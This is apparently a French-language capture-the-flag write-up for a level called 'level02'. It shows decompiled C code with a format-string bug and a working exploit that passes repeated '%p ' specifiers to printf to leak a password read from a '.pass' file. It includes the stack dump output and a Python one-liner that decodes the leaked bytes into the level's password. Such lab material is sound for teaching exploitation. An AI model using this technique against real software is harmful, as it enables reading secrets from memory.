Dans les sources:
  char s2[96];
  int v5;
  char ptr[48];
  char s[96];
  ...
  FILE *stream;
  ...
  stream = fopen("/home/users/level03/.pass", "r");
  v9 = fread(ptr, 1uLL, 0x29uLL, stream);
  fgets(s, 100, stdin);
  ...
  fgets(s2, 100, stdin);
  ...
  printf(s);

s2[96] est avant ptr[] (ou est stocke .pass) dans la memoire, on va tenter de print 96 'A' dans s2 et des '%x ' dans s[96] car s est envoye a printf

bash:

	> python -c "print '%p '*32 + '\n' + 'A'*96" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520  does not have access!

On voit ou s'arrete notre s[] rempli de 'A' (0x41), on prend les 40 prochains bytes (apres notre dernier 0x4141..41 et on skip 0x100..0 et nil):
	0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
On les transforme en char (ecrits a l'envers donc '0x756e505234376848' en memoire = '4868373452506e75' soit 'Hh74RPnu' pour une lecture pour un humain)
	> python -c "print(''.join([bytes.fromhex(x).decode('ascii')[::-1] for x in '0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d'.split('0x') if x]))"
<<< Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H